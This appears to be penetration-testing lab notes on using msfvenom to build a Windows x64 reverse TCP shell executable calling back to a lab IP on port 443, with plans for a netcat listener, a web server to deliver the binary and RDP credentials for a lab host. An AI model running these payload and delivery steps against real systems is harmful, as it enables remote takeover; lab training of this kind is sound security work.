Follow the steps from this section and use msfvenom to create a Windows binary with a staged TCP reverse shell payload. Start a multi/handler within Metasploit to receive the staged reverse shell from VM #1 once you execute the executable file on the system. Enter the command to list all payloads of msfvenom.
msfvenom -l payloads

msfvenom -l payloads --platform windows --arch x64
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.182 LPORT=443 -f exe -o nonstaged.exe

# Now that we have created the malicious binary file, let's use it. For this, we start a Netcat listener on port 443, Python3 web server on port 80, and connect to BRUTE2 via RDP with user justin and password SuperS3cure1337#. Once we've connected over RDP, we can start PowerShell to transfer the file and execute it.
